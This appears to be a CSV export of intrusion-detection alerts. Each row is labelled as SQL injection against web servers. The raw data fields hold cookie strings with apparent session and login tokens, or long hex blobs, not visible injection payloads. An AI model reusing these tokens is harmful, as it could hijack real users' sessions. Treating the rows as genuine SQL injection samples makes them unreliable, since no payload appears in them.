장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-01-30 15:11,121.160.189.219,139.150.87.138,80,SQL Injection," qusT/3BlsZ74E+fTW626FwOqiv73; NNB=PPAQCL4TU5GVY; nx_ssl=2; JSESSIONID=2D2E8531AB3EF8D61F13806C534BB552; cmtAsc=0; HPRC1=UhaSuPEo98GsM3DCRTPII6wv; tracking=""&SID=1605332047&Count=2&Code=0""; PN_LOGIN=lHa5SH2VXb7X-ZM-pKZlYBJ5cvciblBhZ4OjU2VbQxhCv8meXBn4BMJi7OJ8EUdsZatwz9vq4UApyJk_ETfslZrcYe_UOelnKQHMRnzA_L3I3kHF5ooo3URBku_bm57K3SAgk_HvdhuI4U6YASDx3UTpFo-0cP7aTBVepRYniEKxuFvmy9zO7XEQyojRGRLz; GDP_LOGIN=--9W-sj_cvZiSFHarEYt_zRgZcZYrWeSw5gsckGmJknmcsygBlQvCOODnFaOAhwosMtDC6-ACD-Dl0r2uOOXel14k7Ps-QvSXhfaSXD4BHo=; NV_LOGIN=""--9W-sj_cvZiSFHarEYt_zRgZcZYrWeSw5gsckGmJknmcsygBlQvCOODnFaOAhwosMtDC6-ACD-Dl0r2uOOXel14k7Ps-QvSXhfaSXD4BHo=""; PN_PUB=P_ICARUS|A|K0wOhABJQ9AVR9cPxoGY0GAANoI2vO48Q28l7eBOYeB2sDnJEQ9GISFxCI0KD1g5O89PRG002Rt6YSIwWMG8M0G5gG4RsC0a89RHetSnrOByNPPSmeTpmF1kOIEVYFJpJ2wl69tHQdC2a89SRXaUI0J0ZKZVC3cNw3SmjSWHCvGBx7Uvk9hXC3NQoA0ZuMxVAe0Tf0N1NJWoRO7NhQNe2AAX6hyVmoQp-SWdVYRIfo32IA8d8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|U8iO3sH8uT3hBhpAv-C8CT8MOI-S1VNIsGRA6YmE2DGfd02dNHNKIQ6HCHoJKWkV2UFfJ8oBJ3jNJGTx42gZEfpNufR3eRPD7vtUBEHPATm81vRE1DAwUAIP"
2019-02-17 14:12,122.44.5.54,139.150.87.189,80,SQL Injection," u4hgw1nvezITNDGaWR3baSWyDT6NBbWYNYRuelx6BMKAkHmrKgngkymUBvSIxo+9WDKsyvZd51le63OGeIF8bg==; _ga=GA1.3.973930557.1531075024; tracking=""&SID=1338023623&Count=5&Code=0""; PN_LOGIN=TMKUzP_ip6JODNP7oWEvPq-sG9Y8aIy8hSNC_dgfWa4aconhvGrMmk17gQnmR3EQ-LoGn5GUAVj4HP-P-kb5LI5MCqANmrZKbS3li3x4_FKtCjwyFRZmehQBnEoAKCKQqdaySA7Wrcn1IorRzJz3YMEGYDYtbvARb28nX027K3UvUKv6osb0uyklGMnBe6QQYFNLMzoHkSZNnep5m0doXg==; GDP_LOGIN=--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=; NV_LOGIN=""--SUFm5XiKd3cw5BE_EwvFCe0jHFSnh0OrbEE-p18C_7Gs42OEqdWTHElSPmfeSxuTh3bAEH1015cLMwfjTNBBNjbIg520Z53mh6BTxo8mQ=""; PN_PUB=P_ICARUS|A|CGD6QG2uIM9PNfGC9s3A1GfS6AyOxODXqUvNT1tOZ3FXJEvB9nsOmBGOTNWEFHDV9RQeYEfNMeI4eiD17SG79eM7X7EWWM0B98yMXl8HO7361nA0HvKv4GRpOIEVYFJpJ2wl69tHQdC2a89SOuN0hd6eOK1vHBOLfH2mfEhV4hgO1JMYHCOYAI1T1DHm_KutQo8LWW5puS0sCnWCAK9A4VA81v4AxSA98LW69eeUXqUp8Gvx8hhFnEK3W4uJKXc6ejCHQTJa9ZaLpRLIk1P1LRbKnA0WY4x3M07AvN2RfUAFTQlG3qN10CnD|NwHNOcFRA4nRGeQ0wQMnODgITuWSAoCvTPh-9oIQ3518gPul606H3iUXm1wZTvVHJIAPoOovV2g9PK82A2h9Ih-JRSB9G8ZE"
2019-02-09 5:05,59.5.223.142,139.150.87.189,80,SQL Injection," WT4Z75hH3Ahsy6Yk7Ab9W+CET8OZ6BPys0KdZmWvpjzSmnAHBlg1aZXeKNNp2R9lDAv6noyxab8X7UjVGMoGHTe1D8Q+79vQ98ZbIHwjYeGAQ4XnN2b/Qovq5; tracking=""&SID=456485821&Count=4&Code=0""; PN_LOGIN=kJZGh0979PbSwMtuNpue91EGb09y3tyGKTUCuwZqe5tWEij2V3ReJ-MmE0Qdi5jvdVKHj9w3E9TArwNFgzGugl6zOQoWPxoGJHBWbm4Lc8GT9-RCSF9RsBC91hWL9Drph4jB4VxsLKzAGTyFX8D22xjE3jcMjOjt5x-USPJjrGBpzQPDtsWvOicU9oVIgdmMO1k3GQ4vEK8zWDhrSpCm8w==; GDP_LOGIN=--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=; NV_LOGIN=""--ZqiqkUo16TGkm8J1M5yIA9OL5dwaucN5R6v0nP4gfcvT9KB9367M8ok211ordZhVKmfYmUFocQswXwZxUYF4iB7RYZ463qNPUvgJ7bMKg=""; PN_PUB=P_ICARUS|A|TAQVxE5HE2QVUf04XV32zOOR3Q2GxZBwaT8AMhXSOR2WZBmr936BBC9o9DPw9uSG1bBe20xVAn9BXo1YLIgaM0TABl4Xt19DNQfCHj2e1QG74BwLpaHG5Hfp6OlRG6D84Lv059uLPAChp6PD3hF0u5F8dMmqL9-Pv4Vg5CmoPBjCOuNBDOIA0vGJXVJ3GNxK5XD4gIAnvT2FC2LEYPRGUG842xnJATHp1Swb1nc7mbDBf4or5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|V21KhoSpdMWDPg51PIS93DngVA09okDp1Q1jJYeP2o1fxKwfA9dMPiDhP0Z9GvE21380FSvC1HbOHDPh8AQD0Q2TQ930J5gaJphHnSJfrB8i3YfHhcDRy991"
2019-02-18 22:46,220.78.10.98,182.162.96.253,443,SqlInjection, retInfo=A06CB9D5057D0008E0C847805C6A5EFFFC26E0A747A1780936B4142D6086F79EDF43A5A6959AA190048EAB8B18A6366ACA5F14853874CA630F9AD1DE1DDE6F8D3AAD41A60AC83D92E21115E4A6502B0E16ECD0D19F821C3FC24A23FCC7F82ADE626463BC07B9D6206D67F2BE9ACC28BAD536EB12D8CA1A63F70178654512C71F3BC245BB7E3E1E31B6BCE37A0A4CEA3B89B1B0FAED9E932C19B7E3240ACF734FEE53AB23841E8C302EB1C4C27044B1E393136AEEDB7F1627578567B473D7B5ABA864D02D3D33A9899374CFE11FD4A734BCA6A23165646394DF9E19A3932ED4C3212E665904E7A30C84A5AF71F03476FE5B20E977FD32546955E3276C8C0037698984659C4A5BF67F1A81589D69BC2664553171A3B3AC06FF7768CAEDFDEE589EF25173F271AF59E48EE556F7C70DC08B36979013EF9C4C4542553ACA52CB0441FA578D648F9ED18A2E4FD99B6B22EF31516945992F6D56718CCBDEDC4410C7B77C8BE561E4426F830E5F849337F21E233163240A5286C636C9F08E4B1AD0B1BF5320DA4C8E739E3AF2AB002C0D2888E2D952F47C5FA7775728E9BE69C91DA7164E9C12065E0F7E61CF2B735CB89D50F97A354FEB167A2B85CE33093A5E714FF32E8CA873FB9794436F77AE1CED3ABDFC4C46E9F8A7959451FD361A58C7E13BE56EE80CDE97D9C1618E203487ADE89DE8D7635392DC1DA88FDB35B2477CAD7A46B3CCADE038C34E56F90B059B1BC2C628FAA718107D135D75D2EBC6C82310A6BB8B109EF36BAAE319D9CA8E15CA023AD3F1033C493A96E93164BB13F3446894F20109D064C4716CE0A15F2777CD89950E9B2B7CEE03C06782997635FBC1588FE6C328C5D623113C3BE148AFB5D1192F3A9B670847889D6AA52A1C5062895CFB920360B1F967BDC2728516045E1604FE7FCA0B43356323DAB75959F05AD4310157A38C45E8DDE98E7AF8F4C050CC06896E8E9889359F406C51E46329DF0AC16D137E36031D3D61A6FB4D911CC24F21C91414671BE23D1920BB6DACAE6F9F9E1F51D1A782CE92E1F599668F1DD44325D28C32E495EE7CD5B09CEA1FEF4B83B758AF980D0916A1299993C6FA136F7870E1E99839434DBE8D35D808B2C21248C5AF1192DC7CA79D658B85416C955BD8A3186671FE4FB25FC02895F1E1959539597949177CBEFA3A96830DCF7B45D81D511D1228CAC6C2D688BA6AB1C8B52D28A3810D39DE2F76BDE44AFCD4A5AF8764C54E14
2019-02-18 12:53,14.45.217.156,182.162.96.253,443,SqlInjection, retInfo=A12BC8741387FC1DA866F8CEDAD92790CCCEE202C888C5B05973E738A67F2E23EBF412C8C029DDE2BC8AF3CCF8C2C138C99CE073F5EC511B24B57D919A945CFAE514EFA0BE4DEFD106B2FA45FA86A3FCF2E86E9C83B2BBBCC3F7B9795C68E68D3DF2C846F33063DF21326F228E3EF3B32F6B84ADEE12F49587CF18CD29E97EA870D5445E86573AD40CA5F2442AFC27D5F76A7AA64571E2FE2789A6F30BD8CE37AB416FC715CB148B8AE9CAD3170D43F55D3AA7041F05EA50A48EADF20B58002310402E8AE999BC57F7F963145BE2E980410C1AC23B565F5FDDE4A873AA3C1EF89203A7CDA3BD1FF59ED5ABBC88E65208EFAFDB237954AD25C69E602051DC405EB7D06849E2C4A4C78A74E3ED69BB187D6AFA5DE16C57F6D0C09BA905C2FE9706973C3AFC42A7EC65CE68A2B9EB3FFEDB71228559AAC93E37823FE55E996E9248A2793D3DE196D95A173D0CB4BF1E8B13568EDB13EA8A371F92DCB28C9EDEB9C64F91F8B95E67467CFB1BCC6766D0D1FA933E14346740185F60A37B9D67F9583FADB1771F0E8E71B9F91E824A672A2554F3B4B3B3A844B21A4972AE005AC68636E414E4180F2E8101745C8C012E0C605F9B1DDB5D43A6C2CAB62D447301BFD54AB22FB8095BD62C81DA2798199CBDF01D7A56FB669EC7800318C67B239CA90BECF93274794F8EC579A63CCA22C602D742E4E06D81CB1C8763BE828D3875F0A16D3EBB6793EDE68CCC91692FE6D3BBA74B057EA1AFE55B009263E7DDC849F51DF04D8FAF66EE12B9711489ED13DECCB8EF2ABF789F8FDD349F41237ABFF51E0D0EC24BEC63033D8EE61AD0A447925950B07A7428B7E4AC873095EC448A5B79CEEE67334D208D4386A451A69AEE95D9289668BD35EF9BAB5C762F2B15CBE5C99AE496B75F43B9399AFBC63877B042157DF7D2E78AEDAC2C9811DF344352056D6DAADC717F69CED6EC044805DACF5E50C7AB945FD5DE905E5A2DE66B7433CADAC817D3A88AF3A0DF745C9AF98A6FD62E00D5AC4EF8A9E5E6D66601FD3955494B9F87AD47D71D94AB1B52F939A5D6A5532A01610D6B15AF371BC64750AF81C7679AF442A4599A6797E2190F00B2ED93E2F980DA77E89664AF9F6C54E34BE0D33167FD47A9A20F35CA5CC7B6DBD3F3BF41D4623AAFEE740F2F25FB81AB477C970CB66B68C6F37F8B0FFC3A624298F4833C54FD3270BD45DDB5AABAC754540FE48CEFC4F9BB45469AB673A4E2D3858D926B7
2019-02-06 9:05,110.54.148.32,182.162.96.253,443,SqlInjection, retInfo=A63F76FA60F6B0A0E7DC77B92370D712677C4E8EE31CC31C28969463A0A483CD4A8FD4AC9980B9982B2918A376037E20BD0FA588C2AB4B3ACDAD3C71ED4197C6B5845AECA56DD532941EF31F8E70B5CCC9E5F01DB1C58C50E4D2434153E0C82CE528E6E0053AD282BAC26EBA5FC359B4EA9E497BF9E8DFFAE6B4517322D5560BF69E38E17DED4FA298F35F06F16EF61E3F88D0F409C11D459DD9CDA0B2D46DC2FE2102DDB347F04BEDF7E96497A1DB94E683CD38B068ACAE44CD42CC63A23FB5DB2B6EA2B2FE2EAA5A0E803CF5959D8A002B8117B5BF70DBB07467FC73882CC2AB4B0B6BA684ACB22AA07177E3DB05B26057511863D0AA1565F7AC10B5CA721A797DDFF207DCCC684B128ED86F853482DF9A5BFE4F6D0423C254C028B0DB497403884E251D771F9081D0868BFA5D1A6130734BB9414E36F1494A0D3A4E5F053120FEA3B2122A14E1BC823B055898D746792CDE666725035128191297F7546B89A372A9971C118FAC1291A19495E70C6BB017CFEA797876D899FC926605CBE2FA7593FDEFB5BD0CDD1D382B4E8F64A03716CD0FC98D59E0D6E82789D1C6638F422A62A3A91D03DC8693B8A80CDC515BA03B1454A32F14DF4CC39136D1A00F620FCE6915923DA36F8914F2AC36FDD058F3C1D15ADA65EC3B176BAC76814605B7371D00E7C724CC82C9C6F13F6AC93DA17CB7FBC546C737CD7B77B89786F73C47CDC47D5EE7B5E7420028BCC3B90D0B46DFAB3FA51867E1296B667E33F1DCE832405B9690A4308A8F5975791F91942B73729717C30C66B9282A2592269925340D111DC2F66295292B725EFE5769DEF04BE8EFE2004F6066D00651F39091C1080CD716BD7A72F0219EBE40D3880582C00F0F1A06E502F923EF6ADFAF4CFED5656AB658C4E3291EB3A3955884CD1635CF7EFCA438E57E76B126AC1B8242B08B205A89B97570A408155FE9C1CF0510145D1EA39F9CA129BA223EB1DB58ADB29D8F8443D747366D4A1D733E4312877812DDEE46B0FB64734BDA599FB846BDD2DF9BD8FA209E088CEBE6D808CE127F9B9E61460CD47E84CE19FFD1F41253391B7811C2CCB047B11528E14353FC7D8A6A192556FF3C2262B056BD0290D386E427E724545AABE1EFE214D44887738D46BC5BE70693B3654D47FD6D4FBE77A05DBEFA7CAE7E2AB655BA3723E02FCDC3305CD82AE23E4FA38657AB51EEEBFB3E41FF91EECD67BC655A49D5E73CB327559276DF72CDD1
2019-02-19 10:10,121.145.75.99,182.162.96.253,443,SqlInjection, retInfo=C29B64C9558B9B0F1AF628909187E6A781B837BFD51070DBDC417BDAFB891858598221292364569E3FFFF35624304C6FC3BC318B50221A5F9F750B4DB59A60451870DB77DF1461E7FB018C4CC230B9AA6E0A7C5FF51D5D5696E7A4E926283FF8B8561B8478FAC81A408F98790F66356553DDCCDFA178CE6BB2B94F387255ECB9DD34706FBA1AB02DDB957331199E507E5CC3C94C55A49FF936780C7E405D3F04BA82BE5FE68F79E76B27C9390933B99812BF45E5DB3D62AA0D2507B284613324B607686E4330FBAFB9A1B0F1E8F6708266E0FD2DB21775EBC1686613416984AE6183044599590A95FD11673E99302E1E2B91B664D5D84F8A71BA2112587AA14C79BC8FF40DAD66E65922BF8EDCA258009D0FC93ADA3C42ED2BCBB299D57840FC6A42C585F4E4FEFBE360D25D411B3F46868CA066151C85B6694BE4F87AD44DE4FFEC820D9259772A7A5279759FF84E69CB9E9BB3817D56EB3B4777F01FD2243C3CCFBC8F45EAAB9CE27AC81F289821D5DFA57CD4097C04469933EE4C4FE2967DB80966DEB45139F6B09A9B5D5CDB1DB426F2DFDC5E80E35E98DA44187146D7091EDE21A7DC7ED3238941D928C80C45F197D04446A3DB81449F7F9DE0326F6FC39AFA4E59ECEAA0FEA98EB34F605214BCBEBB1F439AF9B32812121DD3737446568459FB0308B4E2C5377D2027261D6ACF2ABD24FC1827643841548B3A6E81AF13C06B37DA9701F418370B144A2CFBEED0C32C345A7C6532170C654D6E59BA394962EF3EE7F5073E0B69DAF444AA6E391CE3E3562D93084FDA7F1100CB27019FBBDF5DBCF4C914580298DD849DD37DD820208D3F98A5DB3C9556FCFD90B012F012CC305F55F2A36A820327D515C47BABD732C9FB5CC14C6D1A4EFE7D01282BCC567ED510CEB282AFE608201E7C6BE4868AC55FFDC265CADA0512C471B0E77C87F40708D7BA760FBA7C0784F8DB0F9A50E042D3C1A95BC9A84E57AE8A57156218F5E8913FE4EE9C130FF7A5C7A9AF3A9F98F885B3C4EB0AF0FBFCA9523A7ABCEB3E315CBBC64842B27A2532C9A6A7E357FB57C417A7D60A54C0D8312A619D088DA5182010740E8663B7E79120D84579483C37684C275E2A33ACB71BE649B2774CE626EB8451915E0E591D6AF94EAB29B2A2A115D8391F8A2060C72D4DBDBEC169D40D7BD158AC2F80F08D95C76ED93DB9AB8F6E9F03AE9261B246FA75903361F68ABAE0D4C1F6A19595FBDBF64F63783
2019-02-10 17:23,211.36.149.68,182.162.96.253,443,SqlInjection, retInfo=C48BE6D2F074D45A05C9F4AFDDA78F1221EBEB1C21D42EED5C1DCCBCC0EC50E0547320D6C05C454B18185E15D1F0EC696D2177415575486ACA8C11E7EBC9EA9A16456ED6C1F5F7E3B035AE48DD527BEEBAACBDBB726915BD69F58581AB51F94D06FEE0DFA8429AD9E34B75FAD9A8A61B501BF68FBA11518587B8FE95BC442C3DA8735C36833DEBEEC66CFAF8C718C0FFEA9835975617B6ADDB4A44BF81B612F0B21653EB2B1EFD3CBBA4748875D56CE89CD3DD2BFC77FAB24EFD36531235FE5AD45A0C8CCB3D16EC628C8371907751D3F0796F852F2634D7E12EA5D11C65EFA1056ACB1884792786660E454D8C93ADB2CEFA27706FB7A42B0A1C893847F04860A1C3662C931745D030ADDF08860AF8ABC01883F48CB6AAC0B044AE5E0C4A65DB23BFA7A9C532882C16F2294BD01CB86DC5E28E376D01ECC9BC08EEDA2B5A72A71FFB49698D04815B25D950258CE4AD658FA84B2AAD1FBA51461EFBBE6345BDFB727594FB67EE9201B2B462F60B8FEFD527AC4844C96A00BFC51FE4B1AF245E28BD250BE68A9387468CFC4EC66F13AE05075CC840FE8718B553F680118C4A0D7D401BC36AF330DE88DE373742507C96EB57B55A350D4350E555FFDB4D94B744D45F51D45015E5942F06F92DFB54B1FE4D69C965B80391A2ADDD1835A49410DF98565150F1F7834D3F397961BED1A5CFD268C0BC3EDBD6D4A5FF6E36D469A5619F5708499F383FA2475A94CD0C0E57CDDB4A1DC035764000EDFBCCC3AAEFCA103F97F14DA997760100EAF83053D8A77ECDBF5CDD0522E231BA221F3EDE22F0C83AB72A0AFCB8A2D92D51436735E9A216308A49AC7E83C93CDC1BE9A93BF7D322E603D8BED5D4E604FFD9416C79A40122A4FB66DD64B7E3C13F2B95CFA33C9B07B5E7C036F458FE083E5497AC9E10B160652AA1C432E20C1D82159D9F56019E68FF6B76F57E4370A1625020E246E1FA865B238999AC798AD2A44722E0C014BCD5A655934ECFC7C5A92CFB3D080F34B96DBD3DB4DEFDAC7BA1EBCDDE3C84F1CA38163CD0C2C6005B8197008752757BDD54BEFB6FD8D857FDB1D414B5382541A605D858BE5DAC70553716448EB9087D924D5331949FD830DDDA29681E8DF60289AD31A3DC45D34D651EDC9B9B7BC77EA7535AB8BC48F6D7C46BB9E6D08EF0E9F987B5CE4603D9D1DAB22C60805B10373FB1123FAD562B3DB5B898A6C6E90BB4BBCBC30E93761448C0CB43C6552B9A43443AA
2019-02-11 22:07,175.124.57.68,182.162.96.253,443,SqlInjection, retInfo=C70615B0C01AED4A35035B89D61934BE1C5FD1589E040DB5551BD882548657FE85FD061C2C11F8DFCF131557C90257812EA0C631F2A0EB64A62E021223C7827F1EBA29FDF5496483DA7A3447C1BF05876FCB3FEF482076844DBBCD579FB0DAA00232777911599A57A58F35B10153588F4FC7D716C6DCBA7F54083A9570CEC90C830E3972BD17929FBB6035E45DB8A5F093AE57547D8B7E8A4C68E9706F094BD581CE9C6B6FAD6F0E1815C0D5AFB3CCE42D2E45B96B27F407791C1EE55719AFD4B2AA722C3CE442F325BD62294CFD3573CCB48849A24EAEE95F724707DFD5AA1294D1575C88AC1AEBB1C42DAAFE14DE07D46208AB9D101855ACCFC42A5E5DBC9B572068F9AD1625681E9F4FB2A10309FAC69912C0844B4624E91A1659BEB1B9D3843B06AB1D9994DD5964E7EB4551196F1FD79818A8BB11CD2488E1DC05F6621E7C6C8E2A21302E9CF5BDE672B8DA2061AE63D567FCF3456B4D8305E5B1F34AFAE44E82B21AFE3B8723DB5009F0F7E4A1D118D7E819ABA8DA8C2A034117F9A19C23067A46E396C271397E3CDED93A62ED2E8B34470D7C6AD07F17303BFAAA9F1C4FCAA6AFA708417978881726273E5061044270E453CC1B790EEA5420581AEF3E03CA273F2136A127D8EA61BCAF08A1FC247C6962C14D0760777D0D4E522EEFD9665C8B6412D7BD56636D08975F24E5CE95E6F912FD8A35C3F93AF4833637A6DA784076F59250C9D59546F85DEF6CB26E29E46474121EC2ECCA0FC5C5CE4C17FB202D6F710C254D740FABD076F9B61CAC385B39A414CB9D981CBC574D11D1B84E22532C70AF6EA05FE1A3C3F14AF0A0FDC04F9309A6F884030F0046DF910A4B4C516543FD2D11A983E3C1149F68318C3ED3C0C1E99D68792D19D0C0F86762B649A949EA0B33507A9CD7B3502B3CE7AD5A1B22CF73CD507DA2A78E01326E3970496096FB79E4BA3C79AFE777D4E7DEE08A5A83FCEF92C21753F8277A833A37D5BBBCAE4B4E3C7DE826E0E7D537D443AEA9C6917FBA19AFEC212AEE67B2BF04085AF0798769B6532A4B323656EE4301781E60DAF83FA097819C94953EA93953293E60D747BDA41081DC033D0547AC568969C002F16CD1AF6260903BD5B1E8F8169103AADBA5DF3060F5FB95483012E4FC6E2064B726115258D89FDC1ACE1861E1380661FD1F7CEF1F04C78A84B269E57D6FA1952655D8741093A7F83EB807D280CC188D8827F3E76C6398FE02A7799F96
